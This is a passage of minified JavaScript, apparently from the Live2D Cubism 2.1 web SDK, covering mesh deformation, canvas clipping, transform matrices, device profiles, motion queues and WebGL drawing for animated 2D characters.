C=s[2*(_+a*M)],N=s[2*(_+a*M)+1],b=p+3*c+1*g,F=f+3*d+1*y,D=p+1*c+3*g,R=f+1*d+3*y,x=p+3*c+3*g,O=f+3*d+3*y,B=.5*(v-1),U=.5*(L-1);B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else{var G=0|S;G==a&&(G=a-1);var B=.5*(v-1),U=S-G,Y=G/a,k=(G+1)/a,C=s[2*(_+G*M)],N=s[2*(_+G*M)+1],D=s[2*(_+(G+1)*M)],R=s[2*(_+(G+1)*M)+1],b=p+3*c+Y*g,F=f+3*d+Y*y,x=p+3*c+k*g,O=f+3*d+k*y;B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else if(L<=0){var V=0|P;V==_&&(V=_-1);var B=P-V,U=.5*(L- -2),X=V/_,z=(V+1)/_,D=s[2*(V+0*M)],R=s[2*(V+0*M)+1],x=s[2*(V+1+0*M)],O=s[2*(V+1+0*M)+1],C=p+X*c-2*g,N=f+X*d-2*y,b=p+z*c-2*g,F=f+z*d-2*y;B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else if(L>=1){var V=0|P;V==_&&(V=_-1);var B=P-V,U=.5*(L-1),X=V/_,z=(V+1)/_,C=s[2*(V+a*M)],N=s[2*(V+a*M)+1],b=s[2*(V+1+a*M)],F=s[2*(V+1+a*M)+1],D=p+X*c+3*g,R=f+X*d+3*y,x=p+z*c+3*g,O=f+z*d+3*y;B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else t.err.printf(\"_$li calc : %.4f , %.4f\\t\\t\\t\\t\\t@@BDBoxGrid\\n\",v,L);else e[T]=p+v*c+L*g,e[T+1]=f+v*d+L*y}else l=P-(0|P),$=S-(0|S),h=2*((0|P)+(0|S)*(_+1)),l+$<1?(e[T]=s[h]*(1-l-$)+s[h+2]*l+s[h+2*(_+1)]*$,e[T+1]=s[h+1]*(1-l-$)+s[h+3]*l+s[h+2*(_+1)+1]*$):(e[T]=s[h+2*(_+1)+2]*(l-1+$)+s[h+2*(_+1)]*(1-l)+s[h+2]*(1-$),e[T+1]=s[h+2*(_+1)+3]*(l-1+$)+s[h+2*(_+1)+1]*(1-l)+s[h+3]*(1-$))}},Z.prototype.transformPoints_sdk1=function(t,i,e,r,o,n,s){for(var _,a,h,l,$,u,p,f=i,c=this._$o,d=this._$A,g=o*s,y=null!=f._$hr?f._$hr:f._$Cr,m=n;m<g;m+=s)at._$ts?(_=e[m],a=e[m+1],_<0?_=0:_>1&&(_=1),a<0?a=0:a>1&&(a=1),_*=c,a*=d,h=0|_,l=0|a,h>c-1&&(h=c-1),l>d-1&&(l=d-1),u=_-h,p=a-l,$=2*(h+l*(c+1))):(_=e[m]*c,a=e[m+1]*d,u=_-(0|_),p=a-(0|a),$=2*((0|_)+(0|a)*(c+1))),u+p<1?(r[m]=y[$]*(1-u-p)+y[$+2]*u+y[$+2*(c+1)]*p,r[m+1]=y[$+1]*(1-u-p)+y[$+3]*u+y[$+2*(c+1)+1]*p):(r[m]=y[$+2*(c+1)+2]*(u-1+p)+y[$+2*(c+1)]*(1-u)+y[$+2]*(1-p),r[m+1]=y[$+2*(c+1)+3]*(u-1+p)+y[$+2*(c+1)+1]*(1-u)+y[$+3]*(1-p))},Z.prototype._$VT=function(){return(this._$o+1)*(this._$A+1)},Z.prototype.getType=function(){return I._$_b},K.prototype=new _t,tt._$42=0,tt.prototype._$zP=function(){this._$3S=new Array,this._$aS=new Array},tt.prototype._$F0=function(t){this._$g0=t._$8L(),this.visible=t._$8L(),this._$NL=t._$nP(),this._$3S=t._$nP(),this._$aS=t._$nP()},tt.prototype.init=function(t){var i=new it(this);return i.setPartsOpacity(this.isVisible()?1:0),i},tt.prototype._$6o=function(t){if(null==this._$3S)throw new Error(\"_$3S _$6 _$Wo@_$6o\");this._$3S.push(t)},tt.prototype._$3o=function(t){if(null==this._$aS)throw new Error(\"_$aS _$6 _$Wo@_$3o\");this._$aS.push(t)},tt.prototype._$Zo=function(t){this._$3S=t},tt.prototype._$xo=function(t){this._$aS=t},tt.prototype.isVisible=function(){return this.visible},tt.prototype._$uL=function(){return this._$g0},tt.prototype._$KP=function(t){this.visible=t},tt.prototype._$ET=function(t){this._$g0=t},tt.prototype.getBaseData=function(){return this._$3S},tt.prototype.getDrawData=function(){return this._$aS},tt.prototype._$p2=function(){return this._$NL},tt.prototype._$ob=function(t){this._$NL=t},tt.prototype.getPartsID=function(){return this._$NL},tt.prototype._$MP=function(t){this._$NL=t},it.prototype=new $,it.prototype.getPartsOpacity=function(){return this._$VS},it.prototype.setPartsOpacity=function(t){this._$VS=t},et._$L7=function(){u._$27(),yt._$27(),b._$27(),l._$27()},et.prototype.toString=function(){return this.id},rt.prototype._$F0=function(t){},ot.prototype._$1s=function(){return this._$4S},ot.prototype._$zP=function(){this._$4S=new Array},ot.prototype._$F0=function(t){this._$4S=t._$nP()},ot.prototype._$Ks=function(t){this._$4S.push(t)},nt.tr=new gt,nt._$50=new gt,nt._$Ti=new Array(0,0),nt._$Pi=new Array(0,0),nt._$B=new Array(0,0),nt.prototype._$lP=function(t,i,e,r){this.viewport=new Array(t,i,e,r)},nt.prototype._$bL=function(){this.context.save();var t=this.viewport;null!=t&&(this.context.beginPath(),this.context._$Li(t[0],t[1],t[2],t[3]),this.context.clip())},nt.prototype._$ei=function(){this.context.restore()},nt.prototype.drawElements=function(t,i,e,r,o,n,s,a){try{o!=this._$Qo&&(this._$Qo=o,this.context.globalAlpha=o);for(var h=i.length,l=t.width,$=t.height,u=this.context,p=this._$xP,f=this._$uP,c=this._$6r,d=this._$3r,g=nt.tr,y=nt._$Ti,m=nt._$Pi,T=nt._$B,P=0;P<h;P+=3){u.save();var S=i[P],v=i[P+1],L=i[P+2],M=p+c*e[2*S],E=f+d*e[2*S+1],A=p+c*e[2*v],I=f+d*e[2*v+1],w=p+c*e[2*L],x=f+d*e[2*L+1];s&&(s._$PS(M,E,T),M=T[0],E=T[1],s._$PS(A,I,T),A=T[0],I=T[1],s._$PS(w,x,T),w=T[0],x=T[1]);var O=l*r[2*S],D=$-$*r[2*S+1],R=l*r[2*v],b=$-$*r[2*v+1],F=l*r[2*L],C=$-$*r[2*L+1],N=Math.atan2(b-D,R-O),B=Math.atan2(I-E,A-M),U=A-M,G=I-E,Y=Math.sqrt(U*U+G*G),k=R-O,V=b-D,X=Math.sqrt(k*k+V*V),z=Y/X;It._$ni(F,C,O,D,R-O,b-D,-(b-D),R-O,y),It._$ni(w,x,M,E,A-M,I-E,-(I-E),A-M,m);var H=(m[0]-y[0])/y[1],W=Math.min(O,R,F),j=Math.max(O,R,F),q=Math.min(D,b,C),J=Math.max(D,b,C),Q=Math.floor(W),Z=Math.floor(q),K=Math.ceil(j),tt=Math.ceil(J);g.identity(),g.translate(M,E),g.rotate(B),g.scale(1,m[1]/y[1]),g.shear(H,0),g.scale(z,z),g.rotate(-N),g.translate(-O,-D),g.setContext(u);if(n||(n=1.2),at.IGNORE_EXPAND&&(n=0),at.USE_CACHED_POLYGON_IMAGE){var it=a._$e0;if(it.gl_cacheImage=it.gl_cacheImage||{},!it.gl_cacheImage[P]){var et=nt.createCanvas(K-Q,tt-Z);at.DEBUG_DATA.LDGL_CANVAS_MB=at.DEBUG_DATA.LDGL_CANVAS_MB||0,at.DEBUG_DATA.LDGL_CANVAS_MB+=(K-Q)*(tt-Z)*4;var rt=et.getContext(\"2d\");rt.translate(-Q,-Z),nt.clip(rt,g,n,Y,O,D,R,b,F,C,M,E,A,I,w,x),rt.drawImage(t,0,0),it.gl_cacheImage[P]={cacheCanvas:et,cacheContext:rt}}u.drawImage(it.gl_cacheImage[P].cacheCanvas,Q,Z)}else at.IGNORE_CLIP||nt.clip(u,g,n,Y,O,D,R,b,F,C,M,E,A,I,w,x),at.USE_ADJUST_TRANSLATION&&(W=0,j=l,q=0,J=$),u.drawImage(t,W,q,j-W,J-q,W,q,j-W,J-q);u.restore()}}catch(t){_._$Rb(t)}},nt.clip=function(t,i,e,r,o,n,s,_,a,h,l,$,u,p,f,c){e>.02?nt.expandClip(t,i,e,r,l,$,u,p,f,c):nt.clipWithTransform(t,null,o,n,s,_,a,h)},nt.expandClip=function(t,i,e,r,o,n,s,_,a,h){var l=s-o,$=_-n,u=a-o,p=h-n,f=l*p-$*u>0?e:-e,c=-$,d=l,g=a-s,y=h-_,m=-y,T=g,P=Math.sqrt(g*g+y*y),S=-p,v=u,L=Math.sqrt(u*u+p*p),M=o-f*c/r,E=n-f*d/r,A=s-f*c/r,I=_-f*d/r,w=s-f*m/P,x=_-f*T/P,O=a-f*m/P,D=h-f*T/P,R=o+f*S/L,b=n+f*v/L,F=a+f*S/L,C=h+f*v/L,N=nt._$50;return null!=i._$P2(N)&&(nt.clipWithTransform(t,N,M,E,A,I,w,x,O,D,F,C,R,b),!0)},nt.clipWithTransform=function(t,i,e,r,o,n,s,a){if(arguments.length<7)return void _._$li(\"err : @LDGL.clip()\");if(!(arguments[1]instanceof gt))return void _._$li(\"err : a[0] is _$6 LDTransform @LDGL.clip()\");var h=nt._$B,l=i,$=arguments;if(t.beginPath(),l){l._$PS($[2],$[3],h),t.moveTo(h[0],h[1]);for(var u=4;u<$.length;u+=2)l._$PS($[u],$[u+1],h),t.lineTo(h[0],h[1])}else{t.moveTo($[2],$[3]);for(var u=4;u<$.length;u+=2)t.lineTo($[u],$[u+1])}t.clip()},nt.createCanvas=function(t,i){var e=document.createElement(\"canvas\");return e.setAttribute(\"width\",t),e.setAttribute(\"height\",i),e||_._$li(\"err : \"+e),e},nt.dumpValues=function(){for(var t=\"\",i=0;i<arguments.length;i++)t+=\"[\"+i+\"]= \"+arguments[i].toFixed(3)+\" , \";console.log(t)},st.prototype._$F0=function(t){this._$TT=t._$_T(),this._$LT=t._$_T(),this._$FS=t._$_T(),this._$wL=t._$nP()},st.prototype.getMinValue=function(){return this._$TT},st.prototype.getMaxValue=function(){return this._$LT},st.prototype.getDefaultValue=function(){return this._$FS},st.prototype.getParamID=function(){return this._$wL},_t.prototype._$yo=function(){return this._$AT&&!this._$JS},_t.prototype._$hS=function(t){this._$AT=t},_t.prototype._$GT=function(){return this._$e0},_t.prototype._$l2=function(t){this._$IP=t},_t.prototype.getPartsIndex=function(){return this._$IP},_t.prototype._$x2=function(){return this._$JS},_t.prototype._$Ib=function(t){this._$JS=t},_t.prototype.getTotalScale=function(){return this.totalScale},_t.prototype.setTotalScale_notForClient=function(t){this.totalScale=t},_t.prototype.getInterpolatedOpacity=function(){return this._$7s},_t.prototype.setInterpolatedOpacity=function(t){this._$7s=t},_t.prototype.getTotalOpacity=function(t){return this.totalOpacity},_t.prototype.setTotalOpacity=function(t){this.totalOpacity=t},at._$2s=\"2.1.00_1\",at._$Kr=201001e3,at._$sP=!0,at._$so=!0,at._$cb=!1,at._$3T=!0,at._$Ts=!0,at._$fb=!0,at._$ts=!0,at.L2D_DEFORMER_EXTEND=!0,at._$Wb=!1;at._$yr=!1,at._$Zs=!1,at.L2D_NO_ERROR=0,at._$i7=1e3,at._$9s=1001,at._$es=1100,at._$r7=2e3,at._$07=2001,at._$b7=2002,at._$H7=4e3,at.L2D_COLOR_BLEND_MODE_MULT=0,at.L2D_COLOR_BLEND_MODE_ADD=1,at.L2D_COLOR_BLEND_MODE_INTERPOLATE=2,at._$6b=!0,at._$cT=0,at.clippingMaskBufferSize=256,at.glContext=new Array,at.frameBuffers=new Array,at.fTexture=new Array,at.IGNORE_CLIP=!1,at.IGNORE_EXPAND=!1,at.EXPAND_W=2,at.USE_ADJUST_TRANSLATION=!0,at.USE_CANVAS_TRANSFORM=!0,at.USE_CACHED_POLYGON_IMAGE=!1,at.DEBUG_DATA={},at.PROFILE_IOS_SPEED={PROFILE_NAME:\"iOS Speed\",USE_ADJUST_TRANSLATION:!0,USE_CACHED_POLYGON_IMAGE:!0,EXPAND_W:4},at.PROFILE_IOS_QUALITY={PROFILE_NAME:\"iOS HiQ\",USE_ADJUST_TRANSLATION:!0,USE_CACHED_POLYGON_IMAGE:!1,EXPAND_W:2},at.PROFILE_IOS_DEFAULT=at.PROFILE_IOS_QUALITY,at.PROFILE_ANDROID={PROFILE_NAME:\"Android\",USE_ADJUST_TRANSLATION:!1,USE_CACHED_POLYGON_IMAGE:!1,EXPAND_W:2},at.PROFILE_DESKTOP={PROFILE_NAME:\"Desktop\",USE_ADJUST_TRANSLATION:!1,USE_CACHED_POLYGON_IMAGE:!1,EXPAND_W:2},at.initProfile=function(){Et.isIOS()?at.setupProfile(at.PROFILE_IOS_DEFAULT):Et.isAndroid()?at.setupProfile(at.PROFILE_ANDROID):at.setupProfile(at.PROFILE_DESKTOP)},at.setupProfile=function(t,i){if(\"number\"==typeof t)switch(t){case 9901:t=at.PROFILE_IOS_SPEED;break;case 9902:t=at.PROFILE_IOS_QUALITY;break;case 9903:t=at.PROFILE_IOS_DEFAULT;break;case 9904:t=at.PROFILE_ANDROID;break;case 9905:t=at.PROFILE_DESKTOP;break;default:alert(\"profile _$6 _$Ui : \"+t)}arguments.length<2&&(i=!0),i&&console.log(\"profile : \"+t.PROFILE_NAME);for(var e in t)at[e]=t[e],i&&console.log(\"  [\"+e+\"] = \"+t[e])},at.init=function(){if(at._$6b){console.log(\"Live2D %s\",at._$2s),at._$6b=!1;!0,at.initProfile()}},at.getVersionStr=function(){return at._$2s},at.getVersionNo=function(){return at._$Kr},at._$sT=function(t){at._$cT=t},at.getError=function(){var t=at._$cT;return at._$cT=0,t},at.dispose=function(){at.glContext=[],at.frameBuffers=[],at.fTexture=[]},at.setGL=function(t,i){var e=i||0;at.glContext[e]=t},at.getGL=function(t){return at.glContext[t]},at.setClippingMaskBufferSize=function(t){at.clippingMaskBufferSize=t},at.getClippingMaskBufferSize=function(){return at.clippingMaskBufferSize},at.deleteBuffer=function(t){at.getGL(t).deleteFramebuffer(at.frameBuffers[t].framebuffer),delete at.frameBuffers[t],delete at.glContext[t]},ht._$r2=function(t){return t<0?0:t>1?1:.5-.5*Math.cos(t*Lt.PI_F)},lt._$fr=-1,lt.prototype.toString=function(){return this._$ib},$t.prototype=new W,$t._$42=0,$t._$Os=30,$t._$ms=0,$t._$ns=1,$t._$_s=2,$t._$gT=new Array,$t.prototype._$_S=function(t){this._$LP=t},$t.prototype.getTextureNo=function(){return this._$LP},$t.prototype._$ZL=function(){return this._$Qi},$t.prototype._$H2=function(){return this._$JP},$t.prototype.getNumPoints=function(){return this._$d0},$t.prototype.getType=function(){return W._$wb},$t.prototype._$B2=function(t,i,e){var r=i,o=null!=r._$hr?r._$hr:r._$Cr;switch(U._$do){default:case U._$Ms:throw new Error(\"_$L _$ro \");case U._$Qs:for(var n=this._$d0-1;n>=0;--n)o[n*U._$No+4]=e}},$t.prototype._$zP=function(){this._$GS=new D,this._$GS._$zP()},$t.prototype._$F0=function(t){W.prototype._$F0.call(this,t),this._$LP=t._$6L(),this._$d0=t._$6L(),this._$Yo=t._$6L();var i=t._$nP();this._$BP=new Int16Array(3*this._$Yo);for(var e=3*this._$Yo-1;e>=0;--e)this._$BP[e]=i[e];if(this._$Eo=t._$nP(),this._$Qi=t._$nP(),t.getFormatVersion()>=G._$s7){if(this._$JP=t._$6L(),0!=this._$JP){if(0!=(1&this._$JP)){var r=t._$6L();null==this._$5P&&(this._$5P=new Object),this._$5P._$Hb=parseInt(r)}0!=(this._$JP&$t._$Os)?this._$6s=(this._$JP&$t._$Os)>>1:this._$6s=$t._$ms,0!=(32&this._$JP)&&(this.culling=!1)}}else this._$JP=0},$t.prototype.init=function(t){var i=new ut(this),e=this._$d0*U._$No,r=this._$32();switch(null!=i._$Cr&&(i._$Cr=null),i._$Cr=new Float32Array(e),null!=i._$hr&&(i._$hr=null),i._$hr=r?new Float32Array(e):null,U._$do){default:case U._$Ms:if(U._$Ls)for(var o=this._$d0-1;o>=0;--o){var n=o<<1;this._$Qi[n+1]=1-this._$Qi[n+1]}break;case U._$Qs:for(var o=this._$d0-1;o>=0;--o){var n=o<<1,s=o*U._$No,_=this._$Qi[n],a=this._$Qi[n+1];i._$Cr[s]=_,i._$Cr[s+1]=a,i._$Cr[s+4]=0,r&&(i._$hr[s]=_,i._$hr[s+1]=a,i._$hr[s+4]=0)}}return i},$t.prototype._$Nr=function(t,i){var e=i;if(this!=e._$GT()&&console.log(\"### assert!! ### \"),this._$GS._$Ur(t)&&(W.prototype._$Nr.call(this,t,e),!e._$IS[0])){var r=$t._$gT;r[0]=!1,v._$Vr(t,this._$GS,r,this._$d0,this._$Eo,e._$Cr,U._$i2,U._$No)}},$t.prototype._$2b=function(t,i){try{this!=i._$GT()&&console.log(\"### assert!! ### \");var e=!1;i._$IS[0]&&(e=!0);var r=i;if(!e&&(W.prototype._$2b.call(this,t),this._$32())){var o=this.getTargetBaseDataID();if(r._$8r==W._$ur&&(r._$8r=t.getBaseDataIndex(o)),r._$8r<0)at._$so&&_._$li(\"_$L _$0P _$G :: %s\",o);else{var n=t.getBaseData(r._$8r),s=t._$q2(r._$8r);null==n||s._$x2()?r._$AT=!1:(n._$nb(t,s,r._$Cr,r._$hr,this._$d0,U._$i2,U._$No),r._$AT=!0),r.baseOpacity=s.getTotalOpacity()}}}catch(t){throw t}},$t.prototype.draw=function(t,i,e){if(this!=e._$GT()&&console.log(\"### assert!! ### \"),!e._$IS[0]){var r=e,o=this._$LP;o<0&&(o=1);var n=this.getOpacity(i,r)*e._$VS*e.baseOpacity,s=null!=r._$hr?r._$hr:r._$Cr;t.setClipBufPre_clipContextForDraw(e.clipBufPre_clipContext),t._$WP(this.culling),t._$Uo(o,3*this._$Yo,this._$BP,s,this._$Qi,n,this._$6s,r)}},$t.prototype.dump=function(){console.log(\"  _$yi( %d ) , _$d0( %d ) , _$Yo( %d ) \\n\",this._$LP,this._$d0,this._$Yo),console.log(\"  _$Oi _$di = { \");for(var t=0;t<this._$BP.length;t++)console.log(\"%5d ,\",this._$BP[t]);console.log(\"\\n  _$5i _$30\");for(var t=0;t<this._$Eo.length;t++){console.log(\"\\n    _$30[%d] = \",t);for(var i=this._$Eo[t],e=0;e<i.length;e++)console.log(\"%6.2f, \",i[e])}console.log(\"\\n\")},$t.prototype._$72=function(t){return null==this._$5P?null:this._$5P[t]},$t.prototype.getIndexArray=function(){return this._$BP},ut.prototype=new Mt,ut.prototype.getTransformedPoints=function(){return null!=this._$hr?this._$hr:this._$Cr},pt.prototype._$HT=function(t){this.x=t.x,this.y=t.y},pt.prototype._$HT=function(t,i){this.x=t,this.y=i},ft.prototype=new i,ft.loadModel=function(t){var e=new ft;return i._$62(e,t),e},ft.loadModel=function(t,e){var r=e||0,o=new ft(r);return i._$62(o,t),o},ft._$to=function(){return new ft},ft._$er=function(t){var i=new _$5(\"../_$_r/_$t0/_$Ri/_$_P._$d\");if(0==i.exists())throw new _$ls(\"_$t0 _$_ _$6 _$Ui :: \"+i._$PL());for(var e=[\"../_$_r/_$t0/_$Ri/_$_P.512/_$CP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$vP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$EP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$pP._$1\"],r=ft.loadModel(i._$3b()),o=0;o<e.length;o++){var n=new _$5(e[o]);if(0==n.exists())throw new _$ls(\"_$t0 _$_ _$6 _$Ui :: \"+n._$PL());r.setTexture(o,_$nL._$_o(t,n._$3b()))}return r},ft.prototype.setGL=function(t){at.setGL(t)},ft.prototype.setTransform=function(t){this.drawParamWebGL.setTransform(t)},ft.prototype.update=function(){this._$5S.update(),this._$5S.preDraw(this.drawParamWebGL)},ft.prototype.draw=function(){this._$5S.draw(this.drawParamWebGL)},ft.prototype._$K2=function(){this.drawParamWebGL._$K2()},ft.prototype.setTexture=function(t,i){null==this.drawParamWebGL&&_._$li(\"_$Yi for QT _$ki / _$XS() is _$6 _$ui!!\"),this.drawParamWebGL.setTexture(t,i)},ft.prototype.setTexture=function(t,i){null==this.drawParamWebGL&&_._$li(\"_$Yi for QT _$ki / _$XS() is _$6 _$ui!!\"),this.drawParamWebGL.setTexture(t,i)},ft.prototype._$Rs=function(){return this.drawParamWebGL._$Rs()},ft.prototype._$Ds=function(t){this.drawParamWebGL._$Ds(t)},ft.prototype.getDrawParam=function(){return this.drawParamWebGL},ft.prototype.setMatrix=function(t){this.drawParamWebGL.setMatrix(t)},ft.prototype.setPremultipliedAlpha=function(t){this.drawParamWebGL.setPremultipliedAlpha(t)},ft.prototype.isPremultipliedAlpha=function(){return this.drawParamWebGL.isPremultipliedAlpha()},ft.prototype.setAnisotropy=function(t){this.drawParamWebGL.setAnisotropy(t)},ft.prototype.getAnisotropy=function(){return this.drawParamWebGL.getAnisotropy()},ct.prototype._$tb=function(){return this.motions},ct.prototype.startMotion=function(t,i){for(var e=null,r=this.motions.length,o=0;o<r;++o)null!=(e=this.motions[o])&&(e._$qS(e._$w0.getFadeOut()),this._$eb&&_._$Ji(\"MotionQueueManager[size:%2d]->startMotion() / start _$K _$3 (m%d)\\n\",r,e._$sr));if(null==t)return-1;e=new dt,e._$w0=t,this.motions.push(e);var n=e._$sr;return this._$eb&&_._$Ji(\"MotionQueueManager[size:%2d]->startMotion() / new _$w0 (m%d)\\n\",r,n),n},ct.prototype.updateParam=function(t){try{for(var i=!1,e=0;e<this.motions.length;e++){var r=this.motions[e];if(null!=r){var o=r._$w0;null!=o?(o.updateParam(t,r),i=!0,r.isFinished()&&(this._$eb&&_._$Ji(\"MotionQueueManager[size:%2d]->updateParam() / _$T0 _$w0 (m%d)\\n\",this.motions.length-1,r._$sr),this.motions.splice(e,1),e--)):(this.motions=this.motions.splice(e,1),e--)}else this.motions.splice(e,1),e--}return i}catch(t){return _._$li(t),!0}},ct.prototype.isFinished=function(t){if(arguments.length>=1){for(var i=0;i<this.motions.length;i++){var e=this.motions[i];if(null!=e&&(e._$sr==t&&!e.isFinished()))return!1}return!0}for(var i=0;i<this.motions.length;i++){var e=this.motions[i];if(null!=e){if(null!=e._$w0){if(!e.isFinished())return!1}else this.motions.splice(i,1),i--}else this.motions.splice(i,1),i--}return!0},ct.prototype.stopAllMotions=function(){for(var t=0;t<this.motions.length;t++){var i=this.motions[t];if(null!=i){i._$w0;this.motions.splice(t,1),t--}else this.motions.splice(t,1),t--}},ct.prototype._$Zr=function(t){this._$eb=t},ct.prototype._$e=function(){console.log(\"-- _$R --\\n\");for(var t=0;t<this.motions.length;t++){var i=this.motions[t],e=i._$w0;console.log(\"MotionQueueEnt[%d] :: %s\\n\",this.motions.length,e.toString())}},dt._$Gs=0,dt.prototype.isFinished=function(){return this._$9L},dt.prototype._$qS=function(t){var i=w.getUserTimeMSec(),e=i+t;(this._$Do<0||e<this._$Do)&&(this._$Do=e)},dt.prototype._$Bs=function(){return this._$sr},gt.prototype.setContext=function(t){var i=this.m;t.transform(i[0],i[1],i[3],i[4],i[6],i[7])},gt.prototype.toString=function(){for(var t=\"LDTransform { \",i=0;i<9;i++)t+=this.m[i].toFixed(2)+\" ,\";return t+=\" }\"},gt.prototype.identity=function(){var t=this.m;t[0]=t[4]=t[8]=1,t[1]=t[2]=t[3]=t[5]=t[6]=t[7]=0},gt.prototype._$PS=function(t,i,e){null==e&&(e=new Array(0,0));var r=this.m;return e[0]=r[0]*t+r[3]*i+r[6],e[1]=r[1]*t+r[4]*i+r[7],e},gt.prototype._$P2=function(t){t||(t=new gt);var i=this.m,e=i[0],r=i[1],o=i[2],n=i[3],s=i[4],_=i[5],a=i[6],h=i[7],l=i[8],$=e*s*l+r*_*a+o*n*h-e*_*h-o*s*a-r*n*l;if(0==$)return null;var u=1/$;return t.m[0]=u*(s*l-h*_),t.m[1]=u*(h*o-r*l),t.m[2]=u*(r*_-s*o),t.m[3]=u*(a*_-n*l),t.m[4]=u*(e*l-a*o),t.m[5]=u*(n*o-e*_),t.m[6]=u*(n*h-a*s),t.m[7]=u*(a*r-e*h),t.m[8]=u*(e*s-n*r),t},gt.prototype.transform=function(t,i,e){null==e&&(e=new Array(0,0));var r=this.m;return e[0]=r[0]*t+r[3]*i+r[6],e[1]=r[1]*t+r[4]*i+r[7],e},gt.prototype.translate=function(t,i){var e=this.m;e[6]=e[0]*t+e[3]*i+e[6],e[7]=e[1]*t+e[4]*i+e[7],e[8]=e[2]*t+e[5]*i+e[8]},gt.prototype.scale=function(t,i){var e=this.m;e[0]*=t,e[1]*=t,e[2]*=t,e[3]*=i,e[4]*=i,e[5]*=i},gt.prototype.shear=function(t,i){var e=this.m,r=e[0]+e[3]*i,o=e[1]+e[4]*i,n=e[2]+e[5]*i;e[3]=e[0]*t+e[3],e[4]=e[1]*t+e[4],e[5]=e[2]*t+e[5],e[0]=r,e[1]=o,e[2]=n},gt.prototype.rotate=function(t){var i=this.m,e=Math.cos(t),r=Math.sin(t),o=i[0]*e+i[3]*r,n=i[1]*e+i[4]*r,s=i[2]*e+i[5]*r;i[3]=-i[0]*r+i[3]*e,i[4]=-i[1]*r+i[4]*e,i[5]=-i[2]*r+i[5]*e,i[0]=o,i[1]=n,i[2]=s},gt.prototype.concatenate=function(t){var i=this.m,e=t.m,r=i[0]*e[0]+i[3]*e[1]+i[6]*e[2],o=i[1]*e[0]+i[4]*e[1]+i[7]*e[2],n=i[2]*e[0]+i[5]*e[1]+i[8]*e[2],s=i[0]*e[3]+i[3]*e[4]+i[6]*e[5],_=i[1]*e[3]+i[4]*e[4]+i[7]*e[5],a=i[2]*e[3]+i[5]*e[4]+i[8]*e[5],h=i[0]*e[6]+i[3]*e[7]+i[6]*e[8],l=i[1]*e[6]+i[4]*e[7]+i[7]*e[8],$=i[2]*e[6]+i[5]*e[7]+i[8]*e[8];m[0]=r,m[1]=o,m[2]=n,m[3]=s,m[4]=_,m[5]=a,m[6]=h,m[7]=l,m[8]=$},yt.prototype=new et,yt._$eT=null,yt._$tP=new Object,yt._$2o=function(){return null==yt._$eT&&(yt._$eT=yt.getID(\"DST_BASE\")),yt._$eT},yt._$27=function(){yt._$tP.clear(),yt._$eT=null},yt.getID=function(t){var i=yt._$tP[t];return null==i&&(i=new yt(t),yt._$tP[t]=i),i},yt.prototype._$3s=function(){return new yt},mt.prototype=new E,mt._$9r=function(t){return new Float32Array(t)},mt._$vb=function(t){return new Int16Array(t)},mt._$cr=function(t,i){return null==t||t._$yL()<i.length?(t=mt._$9r(2*i.length),t.put(i),t._$oT(0)):(t.clear(),t.put(i),t._$oT(0)),t},mt._$mb=function(t,i){return null==t||t._$yL()<i.length?(t=mt._$vb(2*i.length),t.put(i),t._$oT(0)):(t.clear(),t.put(i),t._$oT(0)),t},mt._$Hs=function(){return this._$Gr},mt._$as=function(t){this._$Gr=t},mt.prototype.getGL=function(){return this.gl},mt.prototype.setGL=function(t){this.gl=t},mt.prototype.setTransform=function(t){this.transform=t},mt.prototype._$ZT=function(){var t=this.gl;this.firstDraw&&(this.initShader(),this.firstDraw=!1,this.anisotropyExt=t.getExtension(\"EXT_texture_filter_anisotropic\")||t.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\")||t.getExtension(\"MOZ_EXT_texture_filter_anisotropic\"),this.anisotropyExt&&(this.maxAnisotropy=t.getParameter(this.anisotropyExt.MAX_TEXTURE_MAX_ANISOTROPY_EXT))),t.disable(t.SCISSOR_TEST),t.disable(t.STENCIL_TEST),t.disable(t.DEPTH_TEST),t.frontFace(t.CW),t.enable(t.BLEND),t.colorMask(1,1,1,1),t.bindBuffer(t.ARRAY_BUFFER,null),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,null)},mt.prototype._$Uo=function(t,i,e,r,o,n,s,_){if(!(n<.01&&null==this.clipBufPre_clipContextMask)){var a=(n>.9&&at.EXPAND_W,this.gl);if(null==this.gl)throw new Error(\"gl is null\");var h=1*this._$C0*n,l=1*this._$tT*n,$=1*this._$WL*n,u=this._$lT*n;if(null!=this.clipBufPre_clipContextMask){a.frontFace(a.CCW),a.useProgram(this.shaderProgram),this._$vS=Tt(a,this._$vS,r),this._$no=Pt(a,this._$no,e),a.enableVertexAttribArray(this.a_position_Loc),a.vertexAttribPointer(this.a_position_Loc,2,a.FLOAT,!1,0,0),this._$NT=Tt(a,this._$NT,o),a.activeTexture(a.TEXTURE1),a.bindTexture(a.TEXTURE_2D,this.textures[t]),a.uniform1i(this.s_texture0_Loc,1),a.enableVertexAttribArray(this.a_texCoord_Loc),a.vertexAttribPointer(this.a_texCoord_Loc,2,a.FLOAT,!1,0,0),a.uniformMatrix4fv(this.u_matrix_Loc,!1,this.getClipBufPre_clipContextMask().matrixForMask);var p=this.getClipBufPre_clipContextMask().layoutChannelNo,f=this.getChannelFlagAsColor(p);a.uniform4f(this.u_channelFlag,f.r,f.g,f.b,f.a);var c=this.getClipBufPre_clipContextMask().layoutBounds;a.uniform4f(this.u_baseColor_Loc,2*c.x-1,2*c.y-1,2*c._$EL()-1,2*c._$5T()-1),a.uniform1i(this.u_maskFlag_Loc,!0)}else 